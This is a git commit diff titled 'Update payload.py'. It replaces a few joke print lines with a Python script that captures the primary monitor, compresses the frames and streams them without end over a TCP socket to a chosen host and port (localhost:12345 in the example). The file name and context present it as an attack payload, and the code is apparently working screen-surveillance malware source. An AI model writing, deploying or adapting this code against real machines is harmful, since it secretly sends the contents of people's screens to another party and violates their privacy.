cd2c1e8da98517f1c3db36edc0f5af6690842097
Eko <157775552+ekomain@users.noreply.github.com>
2024-02-12 12:35:34 -0500

    Update payload.py

--- payload.py
+++ payload.py
@@ -1,5 +1,24 @@
-print("dont run this.py")
-print("what happened to the first rule")
+import cv2
+import socket
+import struct
+from mss import mss
+import numpy as np
+import zlib
 
+def send_video(host, port):
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.connect((host, port))
+        with mss() as sct:
+            while True:
+                
+                img = np.array(sct.grab(sct.monitors[1]))
 
-print("ahahaha")
+                _, buffer = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, 80])
+                compressed_img = zlib.compress(buffer, level=6)
+
+                s.sendall(struct.pack(">L", len(compressed_img)))
+
+                s.sendall(compressed_img)
+
+# Example usage
+send_video('localhost', 12345)
